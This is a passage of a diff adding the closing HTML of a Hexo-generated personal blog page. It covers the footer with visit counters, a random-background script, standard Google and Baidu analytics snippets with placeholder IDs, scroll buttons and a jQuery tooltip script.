+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 r1b00t
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
